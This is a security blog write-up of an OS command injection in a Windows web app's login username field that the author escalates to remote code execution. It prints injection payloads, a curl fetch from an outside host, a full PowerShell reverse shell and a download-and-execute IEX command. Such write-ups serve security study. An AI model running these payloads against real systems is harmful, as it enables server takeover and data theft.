---
title: "OS Command Injection to Remote Code Execution"
layout: post
date: 2024-12-10 02:0
categories: blog
---

Exploiting OS Command Injection for Remote Code Execution.

## Target Background
The target is a web application designed for asset management, allowing users to create and manage assets efficiently.

## Authentication Mechanisms
The application supports multiple authentication methods, including a standard login form, Google SSO, and GitHub SSO.

## Identifying the Attack Vector
The attack vector was identified as the login form. Users authenticate by submitting valid credentials through this form. Detailed reconnaissance revealed that the **username** field in the JSON request object is susceptible to OS Command Injection.

## Attack Surface Analysis
During reconnaissance, it was determined that the application operates on a Windows environment. This insight guided the selection of Windows-specific OS command payloads for vulnerability testing. The application’s response was observed to return boolean values (true or false), prompting the use of out-of-band (OOB) techniques to confirm the existence of the vulnerability.

As the application response was observed to be boolean **true** or **false** the out of band request technique was used to confirm the attack vector.

### Request
```http
POST /username_exists HTTP/1.1
Host: target.com
Cookie: session cookie: hello
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: keep-alive

{
	"username": "whoami"
}
```

### Response
```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Wed, 23 Oct 2024 14:55:05 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Cache-Control: no-store
Pragma: no-cache

{
	"success": false
}
```

To validate the attack vector, various OOB techniques such as ping, curl, and wget were employed. Payloads using the ping command revealed variations in response times, confirming the vulnerability.

### Example Payloads
Windows OS Command injection payload used for exploitation.

```text
|ping -c 5 127.0.0.1||
|curl https://thevillagehacker.com/exploit/file.txt||
```

Using the curl technique, a file was successfully downloaded from a remote server, confirming command injection.

## Exploitation
Based on the Windows environment of the application, a PowerShell reverse shell payload was selected for exploitation. This approach enabled a reverse connection to the attacker’s machine.

### PowerShell Reverse Shell Payload
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Final Exploitation Payload

```powershell
|powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://thevillagehacker.com/mypowershell.ps1')"||
```

Upon injecting the above payload, a reverse shell connection was established with the application server. Since the application was running with administrative privileges, full control of the server was achieved.

## Conclusion
The exploitation of an OS Command Injection vulnerability in the **username** field of the login form enabled remote code execution on the target system. The successful attack highlights the importance of securing input fields and implementing robust validation mechanisms to prevent such vulnerabilities.

## Reference
- https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).